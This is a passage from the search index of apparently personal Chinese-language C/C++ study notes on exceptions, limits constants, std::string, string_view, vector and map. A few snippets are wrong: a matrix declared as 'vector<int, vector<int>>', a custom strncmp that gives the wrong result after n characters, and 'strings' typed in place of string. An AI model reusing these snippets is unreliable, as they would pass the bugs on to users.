value1;\n        next = next1;\n    }\n};\n\nListNode *secondPtr = new ListNode(13.5);\nListNode *head = new ListNode(12.5, secondPtr);\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u82b1\u62ec\u53f7\u5b9e\u4f8b\u5316</p> <pre><code>head = new ListNode{v[0], nullptr};\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#c-\u6807\u51c6\u5e93","title":"C++ \u6807\u51c6\u5e93","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#stream","title":"stream","text":"<pre><code>#include &lt;sstream&gt;\n\nint val=123;\n\n// object from the class stringstream\nstringstream geek;\n\n// inserting integer val in geek stream\ngeek &lt;&lt; val;\n\n// The object has the value 123\n// and stream it to the string x\nstring x;\ngeek &gt;&gt; x;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5f02\u5e38\u5904\u7406","title":"\u5f02\u5e38\u5904\u7406","text":"<p>C++ \u5f02\u5e38\u5904\u7406 - C++ \u6559\u7a0b (yiibai.com) (41 \u5c01\u79c1\u4fe1 / 80 \u6761\u6d88\u606f) \u5982\u4f55\u7528 C \u8bed\u8a00\u5b9e\u73b0\u5f02\u5e38/\u72b6\u51b5\u5904\u7406\u673a\u5236\uff1f - \u77e5\u4e4e (zhihu.com) Programming in Lua\uff08\u4e8c\uff09\uff0d \u5f02\u5e38\u4e0e\u9519\u8bef\u7801 | \u6280\u672f\u5947\u5f02\u70b9 (techsingular.net) C \u8bed\u8a00\u4e2d\u7684\u5f02\u5e38\u5904\u7406 - Sirk - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>\u81ea\u4ece C \u88ab\u53d1\u660e\u521d\u6765\uff0cC \u7a0b\u5e8f\u5458\u5c31\u4e60\u60ef\u4f7f\u7528\u9519\u8bef\u4ee3\u7801\uff0c\u4f46\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf\u6216\u8fd4\u56de\u9519\u8bef\u4ee3\u7801\u6765\u8868\u793a\u4e00\u4e2a\u5f02\u5e38\u72b6\u6001\uff0c\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1\u51fd\u6570\u8c03\u7528\u8005\u5c06\u4e00\u5b9a\u68c0\u6d4b\u53d8\u91cf\u6216\u6d4b\u8bd5\u9519\u8bef\u4ee3\u7801\u3002\u7ed3\u679c\u7a0b\u5e8f\u4f1a\u4ece\u5b83\u9047\u5230\u7684\u5f02\u5e38\u72b6\u6001\u7ee7\u7eed\u8fd0\u884c\uff0c\u5f02\u5e38\u6ca1\u6709\u88ab\u6355\u83b7\uff0c\u7a0b\u5e8f\u7acb\u5373\u4f1a\u7ec8\u6b62\u6267\u884c\u3002\u7531</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u629b\u51fa\u5f02\u5e38","title":"\u629b\u51fa\u5f02\u5e38","text":"<p>throw \u8bed\u53e5\u51b3\u5b9a\u629b\u51fa\u5f02\u5e38\u7c7b\u578b</p> <pre><code>double division(int a, int b)\n{\n   if( b == 0 )\n   {\n      throw \"Division by zero condition!\";\n   }\n   return (a/b);\n}\n</code></pre> <pre><code> try {\n   z = division(x, y);\n   cout &lt;&lt; z &lt;&lt; endl;\n }catch (const char* msg) {\n   cerr &lt;&lt; msg &lt;&lt; endl;\n }\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6355\u83b7\u5f02\u5e38","title":"\u6355\u83b7\u5f02\u5e38","text":"<ul> <li>\u6309\u60c5\u51b5\u6355\u83b7\u4e0d\u540c\u7c7b\u578b\u5f02\u5e38</li> </ul> <pre><code>try\n{\n   // protected code\n}catch( ExceptionName1 e1 )\n{\n   // catch block\n}catch( ExceptionName2 e2 )\n{\n   // catch block\n}\n</code></pre> <p><code>...</code>\u6355\u83b7\u4efb\u610f\u7c7b\u578b</p> <pre><code>try {\n    x = stoi(s, &amp;pos);\n    if(pos!=len){\n        is_digit = false;\n    }\n} catch (...) {\n    is_digit = false;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5f02\u5e38\u7c7b\u578b","title":"\u5f02\u5e38\u7c7b\u578b","text":"<p>\u5f02\u5e38\u53ef\u4ee5\u662f\u4efb\u610f\u7c7b\u578b\uff0c\u7531 throw \u8bed\u53e5\u51b3\u5b9a c++<code>&lt;exception&gt;</code>\u5b9a\u4e49\u4e86\u6807\u51c6\u5f02\u5e38\u7c7b\u578b </p> <p>what() \u65b9\u6cd5\u8fd4\u56de\u5f02\u5e38\u539f\u56e0</p> <pre><code>std::cout &lt;&lt; e.what() &lt;&lt; std::endl;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u6570","title":"\u5e38\u6570","text":"<p>https://cplusplus.com/reference/climits/</p> <pre><code>#include &lt;cstdio&gt;\n#include &lt;climits&gt;\nusing namespace std;\n\nint main(){\n    printf(\"SCHAR_MIN: %d\\n\", SCHAR_MIN);       // -128\n    printf(\"SCHAR_MAX: %d\\n\", SCHAR_MAX);       // 127\n    printf(\"UCHAR_MAX: %d\\n\", UCHAR_MAX);       // 255\n    printf(\"CHAR_MIN: %d\\n\", CHAR_MIN);         // -128\n    printf(\"CHAR_MAX: %d\\n\", CHAR_MAX);         // 127\n    printf(\"INT_MIN: %d\\n\", INT_MIN);           // -2147483648\n    printf(\"INT_MAX: %d\\n\", INT_MAX);           // 2147483647\n    printf(\"UINT_MAX: %u\\n\", UINT_MAX);         // 4294967295\n    printf(\"LONG_MIN: %ld\\n\", LONG_MIN);        // -9223372036854775808\n    printf(\"LONG_MAX: %ld\\n\", LONG_MAX);        // 9223372036854775807\n    printf(\"ULONG_MAX: %lu\\n\", ULONG_MAX);      // 18446744073709551615\n    printf(\"LLONG_MIN: %lld\\n\", LLONG_MIN);     // -9223372036854775808\n    printf(\"LLONG_MAX: %lld\\n\", LLONG_MAX);     // 9223372036854775807\n    printf(\"ULLONG_MAX: %llu\\n\", ULLONG_MAX);   // 18446744073709551615\n\n    printf(\"DECIMAL_DIG: %d\\n\", DECIMAL_DIG); //21\n\n    printf(\"FLT_MIN: %e\\n\", FLT_MIN);       // 1.175494e-38\n    printf(\"FLT_MAX: %e\\n\", FLT_MAX);       // 3.402823e+38\n    printf(\"DBL_MIN: %e\\n\", DBL_MIN);       // 2.225074e-308\n    printf(\"DBL_MAX: %e\\n\", DBL_MAX);       // 1.797693e+308\n    printf(\"LDBL_MIN: %Le\\n\", LDBL_MIN);    // 3.362103e-4932   //\u4f7f\u7528 Lf format\n    printf(\"LDBL_MAX: %Le\\n\", LDBL_MAX);    // 1.189731e+4932\n\n    printf(\"sizeof(double))     : %ld\\n\", sizeof(double)); // 8\n    printf(\"sizeof(long double)): %ld\\n\", sizeof(long double)); // 16 (\u6709\u4e9b\u53ef\u80fd\u4e3a 10)\n\n    printf(\"FLT_EPSILON: %e\\n\", FLT_EPSILON);   // 1.192093e-07\n    printf(\"DBL_EPSILON: %e\\n\", DBL_EPSILON);   // 2.220446e-16\n    return 0;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5bb9\u5668","title":"\u5bb9\u5668","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#array","title":"array","text":"<p>\u8f6c\u6362\u6210 C \u7684\u6570\u7ec4</p> <pre><code>void foo(int *p, int len) {  \n    return;  \n}  \n\nstd::array&lt;int, 4&gt; arr = {1,2,3,4};  \n\n// C \u98ce\u683c\u63a5\u53e3\u4f20\u53c2  \n// foo(arr, arr.size()); // \u975e\u6cd5\uff0c\u65e0\u6cd5\u9690\u5f0f\u8f6c\u6362  \nfoo(&amp;arr[0], arr.size());  \nfoo(arr.data(), arr.size());\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#vector","title":"vector","text":"<p>\u6784\u9020\u51fd\u6570</p> <pre><code>// default (1) \nexplicit vector (const allocator_type&amp; alloc = allocator_type());\n// fill (2) \nexplicit vector (size_type n);\nvector (size_type n, const value_type&amp; val, const allocator_type&amp; alloc = allocator_type());\n// range (3) \ntemplate &lt;class InputIterator&gt;  vector (InputIterator first, InputIterator last, const allocator_type&amp; alloc = allocator_type());\n// copy (4) \nvector (const vector&amp; x);vector (const vector&amp; x, const allocator_type&amp; alloc);\n// move (5) \nvector (vector&amp;&amp; x);vector (vector&amp;&amp; x, const allocator_type&amp; alloc);\n// initializer list (6) \nvector (initializer_list&lt;value_type&gt; il,       const allocator_type&amp; alloc = allocator_type());\n</code></pre> <p>initializer_list</p> <pre><code># \u521d\u59cb\u5316\nvector&lt;int, vector&lt;int&gt;&gt; v(m, vector&lt;int&gt;(n, 0)); //mxn \u77e9\u9635\n\nvector&lt;int&gt; v = {1, 2, 3, 4};\n\nvector&lt;int&gt; v2(initializer_list&lt;int&gt;{1,2})\nvector&lt;int&gt; v2{1,2}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#erase--insert","title":"erase &amp; insert","text":"<p>erase</p> <ul> <li>\u8fd4\u56de\u5220\u9664\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668</li> </ul> <pre><code>iterator erase (const_iterator position);\niterator erase (const_iterator first, const_iterator last);\n</code></pre> <p>insert</p> <ul> <li>\u5728 postion \u524d\u9762\u63d2\u5165</li> <li>\u8fd4\u56de\u7b2c\u4e00\u4e2a\u65b0\u63d2\u5165\u5143\u7d20\u7684\u8fed\u4ee3\u5668</li> </ul> <pre><code>iterator insert (const_iterator position, const value_type&amp; val);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#string","title":"string","text":"<p>\u6784\u9020\u51fd\u6570\uff0c\u5e38\u7528</p> <ul> <li>fill\uff1an, char</li> <li>c-str\uff1a\u4ee5 0 \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32</li> <li>buffer\uff1abuf + len</li> <li>substring</li> </ul> <pre><code>// default (1)  \nstring();\n// copy (2) \nstring (const string&amp; str);\n// substring (3) \nstring (const string&amp; str, size_t pos, size_t len = npos);\n// from c-string (4) \nstring (const char* s);\n// from buffer (5) \nstring (const char* s, size_t n);\n// fill (6) \nstring (size_t n, char c);\n// range (7) \ntemplate &lt;class InputIterator&gt;  string  (InputIterator first, InputIterator last);\n// initializer list (8) \nstring (initializer_list&lt;char&gt; il);\n// move (9) \nstring (string&amp;&amp; str) noexcept;\n</code></pre> <p>\u83b7\u5f97 c str <pre><code>s.c_str()\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u63d2\u5165\u5220\u9664","title":"\u63d2\u5165\u5220\u9664","text":"<p>\u63d2\u5165</p> <p>string \u7279\u6709\u65b9\u5f0f\uff1a\u4e0b\u6807</p> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a pos\uff0c\u5728 pos \u5de6\u4fa7\u63d2\u5165<ul> <li>0&lt;= pos &lt;= n\uff0cn+1 \u4e2a\u63d2\u5165\u4f4d\u7f6e</li> </ul> </li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7c7b\u4f3c\u4e8e\u6784\u9020\u51fd\u6570\u5404\u79cd\u5b57\u7b26\u4e32\u7c7b\u578b</li> </ul> <pre><code>string&amp; insert (size_t pos, const string&amp; str);\n</code></pre> <p>\u6807\u51c6\u8fed\u4ee3\u5668\u65b9\u5f0f</p> <ul> <li>\u5220\u9664\u5355\u4e2a\u8fed\u4ee3\u5668\u5bf9\u5e94\u5143\u7d20\uff0c\u6216\u8005\u4f7f\u7528\u8f93\u5165\u8fed\u4ee3\u5668\u6307\u5b9a\u4e00\u4e2a range</li> <li>\u8fd4\u56de\u66f4\u65b0\u540e\u7684\u8fed\u4ee3\u5668</li> </ul> <pre><code>iterator insert (const_iterator p, char c);\ntemplate &lt;class InputIterator&gt;iterator insert (iterator p, InputIterator first, InputIterator last);\n</code></pre> <p>\u5220\u9664</p> <ul> <li>string \u7279\u6709\u65b9\u5f0f\uff1a\u5220\u9664\u5b50\u4e32</li> </ul> <pre><code>string&amp; erase (size_t pos = 0, size_t len = npos);\n</code></pre> <ul> <li>\u6807\u51c6\u8fed\u4ee3\u5668\u65b9\u5f0f</li> </ul> <pre><code>iterator erase (const_iterator p);\niterator erase (const_iterator first, const_iterator last);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u67e5\u627e","title":"\u67e5\u627e","text":"<p>\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u7d22\u5f15</p> <pre><code>string (1) \nsize_t find (const string&amp; str, size_t pos = 0) const noexcept;\nc-string (2) \nsize_t find (const char* s, size_t pos = 0) const;\nbuffer (3) \nsize_t find (const char* s, size_t pos, size_type n) const;\ncharacter (4) \nsize_t find (char c, size_t pos = 0) const noexcept;\n</code></pre> <p>\u6ca1\u627e\u5230\u8fd4\u56de npos</p> <pre><code>static const size_t npos = -1;\n</code></pre> <p>This value, when used as the value for a\u00a0len\u00a0(or\u00a0sublen) parameter in\u00a0string's member functions, means\u00a0\"until the end of the string\".  As a return value, it is usually used to indicate no matches.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u62fc\u63a5","title":"\u62fc\u63a5","text":"<ul> <li>\u62fc\u63a5\u662f\u5728\u539f\u672c\u5b57\u7b26\u4e32\u4e0a\u4fee\u6539\uff0c\u5982\u679c\u4e0d\u9700\u8981\u6539\u53d8\u6e90\u5b57\u7b26\u4e32\u4f7f\u7528 <code>+</code></li> <li>append \u5355\u4e2a\u5b57\u7b26\uff1a<code>digits.append(1, 'x');</code></li> </ul> <pre><code>// string (1) \nstring&amp; append (const string&amp; str);\n// substring (2) \nstring&amp; append (const string&amp; str, size_t subpos, size_t sublen);\n// c-string (3) \nstring&amp; append (const char* s);\n// buffer (4) \nstring&amp; append (const char* s, size_t n);\n// fill (5) \nstring&amp; append (size_t n, char c);\n// range (6) \ntemplate &lt;class InputIterator&gt;   string&amp; append (InputIterator first, InputIterator last);\n// initializer list(7) \nstring&amp; append (initializer_list&lt;char&gt; il);\n</code></pre> <pre><code>//range\ntemplate &lt;class InputIterator&gt;  string  (InputIterator first, InputIterator last);\n//initializer list\nstring (initializer_list&lt;char&gt; il);\n\nsize() &lt;=&gt; length()\n</code></pre> <p>\u8f6c\u6362\u4e3a C string\uff0c\u6ce8\u610f\u8fd4\u56de\u503c\u662f const</p> <pre><code>const char* c_str() const noexcept;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u66ff\u6362","title":"\u66ff\u6362","text":"<ul> <li>string: <code>string&amp; replace (size_t pos,        size_t len,        const string&amp; str);</code></li> <li>substring</li> <li>c-string</li> <li>buffer(char* s , size_t n)</li> <li>fill: <code>string&amp; replace (size_t pos,        size_t len,        size_t n, char c);</code></li> </ul> <pre><code>// replacing in a string\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nint main ()\n{\n  std::string base=\"this is a test string.\";\n  std::string str2=\"n example\";\n  std::string str3=\"sample phrase\";\n  std::string str4=\"useful.\";\n\n  // replace signatures used in the same order as described above:\n\n  // Using positions:                 0123456789*123456789*12345\n  std::string str=base;           // \"this is a test string.\"\n  str.replace(9,5,str2);          // \"this is an example string.\" (1)\n  str.replace(19,6,str3,7,6);     // \"this is an example phrase.\" (2)\n  str.replace(8,10,\"just a\");     // \"this is just a phrase.\"     (3)\n  str.replace(8,6,\"a shorty\",7);  // \"this is a short phrase.\"    (4)\n  str.replace(22,1,3,'!');        // \"this is a short phrase!!!\"  (5)\n\n  // Using iterators:                                               0123456789*123456789*\n  str.replace(str.begin(),str.end()-3,str3);                    // \"sample phrase!!!\"      (1)\n  str.replace(str.begin(),str.begin()+6,\"replace\");             // \"replace phrase!!!\"     (3)\n  str.replace(str.begin()+8,str.begin()+14,\"is coolness\",7);    // \"replace is cool!!!\"    (4)\n  str.replace(str.begin()+12,str.end()-4,4,'o');                // \"replace is cooool!!!\"  (5)\n  str.replace(str.begin()+11,str.end(),str4.begin(),str4.end());// \"replace is useful.\"    (6)\n  std::cout &lt;&lt; str &lt;&lt; '\\n';\n  return 0;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b50\u4e32","title":"\u5b50\u4e32","text":"<ul> <li>\u6ce8\u610f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u957f\u5ea6</li> </ul> <pre><code>string substr (size_t pos = 0, size_t len = npos) const;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362","title":"\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362","text":"<p>C++ \u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362\u5b8c\u5168\u653b\u7565 (biancheng.net)</p> <ul> <li>\u4f7f\u7528\u5b57\u7b26\u4e32\u6d41\u5bf9\u8c61</li> <li>\u4f7f\u7528 stoX, to_string</li> </ul> <p>stoX</p> <ul> <li>pos \u8fd4\u56de\u7b2c\u4e00\u4e2a\u8f6c\u6362\u5931\u8d25\u7684\u4f4d\u7f6e\uff0c\u5982<code>stoi(\"-34iseven\", &amp;pos)</code>\uff0cpos \u4e3a 3</li> <li>\u629b\u51fa\u5f02\u5e38 invalid_argument</li> </ul> <pre><code>string to_string(int value)  \nstring to_string(long value)  \nstring to_string(double value)\n\nint stoi(const strings str, size_t* pos = 0, int base = 10)  \nlong stol(const strings str, size_t* pos = 0, int base = 10)  \nfloat stof(const strings str, size_t* pos = 0)  \ndouble stod(const strings str, size_t* pos = 0)\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_viewc17","title":"string_view(c++17)","text":"<p>\u4f1a\u53d1\u73b0 c++ string \u662f basic_string \u6a21\u677f\u7c7b\u7684\u5b9e\u4f8b\u3002string_view \u5219\u662f basic_string_view \u7684\u5b9e\u4f8b\u3002</p> <pre><code>typedef std::__cxx11::basic_string&lt;char&gt; std::string\nusing std::string_view = std::basic_string_view&lt;char&gt;\n</code></pre> <p>string_view \u63cf\u8ff0\u4e86\u4e00\u4e2a\u5e38\u91cf\u7684\u3001\u8fde\u7eed\u7684 charT \u5e8f\u5217 (constant contiguous sequence of\u00a0<code>CharT</code>)\uff0c\u4e0b\u6807\u4ece 0 \u5f00\u59cb\u3002</p> <ul> <li>\u53ef\u4ee5\u770b\u4f5c\u4e00\u4e2a\u5305\u542b const \u6307\u9488\u548c size \u7684\u7ed3\u6784\u4f53\u3002</li> <li>\u901a\u8fc7<code>data()</code>\u83b7\u5f97 const_pointer\uff08<code>const char *</code>)</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6784\u9020\u51fd\u6570","title":"\u6784\u9020\u51fd\u6570","text":"<pre><code>constexpr basic_string_view( const basic_string_view&amp; other ) noexcept\n    = default;\nconstexpr basic_string_view( const CharT* s );  # \u4e0d\u5305\u542b\u7ed3\u5c3enull\u5b57\u7b26\nconstexpr basic_string_view( const CharT* s, size_type count );  #\u524dcount\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u5305\u542bnull\n\nconst char* one_0_two = \"One\\0Two\";\nstd::string_view one_two_v{one_0_two, 7}; //size = 7\nstd::string_view one_v{one_0_two}; //size = 3\n\n//\u867d\u7136\u6ca1\u6709 string \u7684\u6784\u9020\u51fd\u6570\uff0c\u4f46\u662f string \u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a string_view\n  std::string cppstr = \"Foo\";\n    std::string_view cppstr_v(cppstr); // overload (2), after\n                                       // std::string::operator string_view\n</code></pre> <p>operator<code>\"\" sv</code> Constructs a\u00a0<code>string_view</code>\u00a0from a string literal. Requires namespace\u00a0<code>std::literals::string_view_literals</code>.</p> <pre><code>using namespace std;\nusing namespace literals::string_view_literals;\nstring_view sv{ \"Hello\"sv };\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5176\u5b83\u51fd\u6570","title":"\u5176\u5b83\u51fd\u6570","text":"<p>\u6bd4\u8f83\u51fd\u6570</p> <pre><code>template&lt; class CharT, class Traits &gt;\nconstexpr bool operator==( std::basic_string_view&lt;CharT,Traits&gt; lhs,\n                           std::basic_string_view&lt;CharT,Traits&gt; rhs ) noexcept;\n</code></pre> <p>\u8fd8\u53ef\u4ee5\u83b7\u5f97\u5b50 string_view</p> <pre><code>constexpr basic_string_view substr( size_type pos = 0,\n                                    size_type count = npos ) const;\n</code></pre> <p>find \u8fd4\u56de offset</p> <pre><code>constexpr\u00a0size_type find(\u00a0basic_string_view v, size_type pos\u00a0=\u00a00\u00a0)\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6ce8\u610f\u4e8b\u9879","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>c++ - How to efficiently get a <code>string_view</code> for a substring of <code>std::string</code> - Stack Overflow \u51fd\u6570\u4e0d\u5e94\u8be5\u8fd4\u56de string_view\u3002The consensus of advice from this group is that\u00a0<code>std::string_view</code>\u00a0must never be returned from a function, which means that my first offering above is bad form.</p> <p>As a result,\u00a0<code>std::string_view</code>\u00a0should be used with the utmost care, because from a memory management point of view it is equivalent to a copyable pointer pointing into the state of another object, which may no longer exist. However, it looks and behaves in all other respects like a value type.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#string-\u6bd4\u8f83\u907f\u514d\u590d\u5236","title":"string \u6bd4\u8f83\u907f\u514d\u590d\u5236","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#c-\u5b57\u7b26\u4e32\u6bd4\u8f83","title":"C \u5b57\u7b26\u4e32\u6bd4\u8f83","text":"<pre><code>int strcmp (const char* str1, const char* str2);\nint strncmp(const char *str1, const char *str2, size_t n)\n</code></pre> <p>strncmp: This function starts comparing the first character of each string. If they are equal to each other, it continues with the following pairs until the characters differ, until a terminating null-character is reached, or until\u00a0num\u00a0characters match in both strings, whichever happens first.</p> <ul> <li>\u6ce8\u610f\u662f<code>const char*</code>\uff0c\u5426\u5219\u4f20\u5165<code>string.c_str()</code>\u65f6\u4f1a\u62a5\u9519</li> </ul> <pre><code>int my_strcmp(const char *p1, const char *p2) {\n    while (*p1 &amp;&amp; *p2) {\n        if (*p1 != *p2) {\n            return *p1 - *p2;\n        }\n        p1++;\n        p2++;\n    }\n    return *p1 - *p2;\n}\nint my_strncmp(const char *p1, const char *p2, int n) {\n    while (*p1 &amp;&amp; *p2 &amp;&amp; n) {\n        if (*p1 != *p2) {\n            return *p1 - *p2;\n        }\n        p1++;\n        p2++;\n        n--;\n    }\n    return *p1 - *p2;\n}\n\nmy_strcmp(s1.c_str(), s1.c_str());\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_view--string","title":"<code>string_view == string</code>","text":"<p>c++ - c++17 Ambiguity when compare string_view with string - Stack Overflow \u95ee\u9898\uff1astring_view \u548c string \u90fd\u80fd\u8f6c\u6362\u6210\u5bf9\u65b9\uff0c\u4ee5\u4e0b\u4ee3\u7801\u662f\u5426\u6709\u6b67\u4e49</p> <pre><code>std::string s1 = \"123\";\nstd::string_view s2 = \"123\";\n// in the following comparison, will s1 use the convert operator to generate a string_view, or will s2 use string's string_view constructor to generate a string?\nif (s1 == s2) {...}\n</code></pre> <ul> <li>string \u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a string_view</li> <li><code>==</code>\u64cd\u4f5c\u7b26\u6709\u4e00\u4e2a override \u7248\u672c\uff0c\u652f\u6301\u53c2\u6570\u9690\u5f0f\u8f6c\u6362\u4e3a string_view</li> <li>\u56e0\u6b64<code>s1==s2</code>\u65f6\u4f7f\u7528 string_view</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#map--set","title":"map &amp; set","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#lower_boud","title":"lower_boud","text":"<p>\u53ef\u4ee5\u7528\u4e8e\u67e5\u627e map \u4e2d\u6700\u63a5\u8fd1 x \u7684\u5143\u7d20</p> <pre><code>auto it = s.lower_bound(num);\nint right = *it;\nint left = *(--it);  // it-1 \u662f\u4e0d\u884c\u7684\uff0cit \u662f\u53cc\u5411\u8fed\u4ee3\u5668\uff0c\u4e0d\u652f\u6301 it+i/it-i \u64cd\u4f5c\n</code></pre> <ul> <li>\u6ce8\u610f\u662f<code>s.lower_bound</code>\u4e0d\u662f<code>lower_bound(s.begin(), s.end())</code><ul> <li>\u4e00\u6b21 oj \u4e2d\u53d1\u73b0\u540e\u8005\u53ef\u4ee5\u8fd0\u884c\uff0c\u4f46\u662f\u4f1a\u8d85\u65f6</li> </ul> </li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u63d2\u5165\u5143\u7d20","title":"\u63d2\u5165\u5143\u7d20","text":"<pre><code>pair&lt;iterator,bool&gt; insert (const value_type&amp; val);\ntemplate &lt;class P&gt; pair&lt;iterator,bool&gt; insert (P&amp;&amp; val);\n</code></pre> <ul> <li>\u8fd4\u56de\u503c\uff1aret.first \u4e3a\u63d2\u5165\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002ret.second \u6307\u793a\u5143\u7d20\u662f\u5426\u5b58\u5728</li> </ul> <pre><code>  //\u63d2\u5165\n  mymap.insert ( std::pair&lt;char,int&gt;('a',100) );\n  mymap.insert ( std::pair&lt;char,int&gt;('z',200) );\n\n  //\u8fd4\u56de\u503c\n  std::pair&lt;std::map&lt;char,int&gt;::iterator,bool&gt; ret;\n  ret = mymap.insert ( std::pair&lt;char,int&gt;('z',500) );\n  if (ret.second==false) {\n    std::cout &lt;&lt; \"element 'z' already existed\";\n    std::cout &lt;&lt; \" with a value of \" &lt;&lt; ret.first-&gt;second &lt;&lt; '\\n';\n  }\n\n  //\u4f7f\u7528 [] \u63d2\u5165\uff0c\u5f53 key \u4e0d\u5b58\u5728\u65f6\u4f1a\u81ea\u52a8\u521b\u5efa\u5143\u7d20\n  mapped_type&amp; operator[] (const key_type&amp; k)\n  //\u7b49\u4ef7\u4e8e\u5982\u4e0b\u8c03\u7528\n  (\n      *( //*iterator\n          (//pair&lt;iterator,bool&gt;\n              this-&gt;insert(make_pair(k, mapped_type()))\n          ).first\n      )\n  );\n\n  std::map&lt;char,std::string&gt; mymap;\n\n  mymap['a']=\"an element\";\n  mymap['b']=\"another element\";\n  mymap['c']=mymap['b'];\n  cout &lt;&lt; \"mymap['d'] is \" &lt;&lt; mymap['d']  // \u7a7a\uff0c\u5bf9\u4e8e int mapped_type\uff0c\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a 0\n\n  //\u4f7f\u7528 at() \u6765\u4fee\u6539\u5143\u7d20\uff0c\u5f53\u4e0d\u5b58\u5728\u65f6\u4f1a\u62a5\u9519\n  mapped_type&amp; at (const key_type&amp; 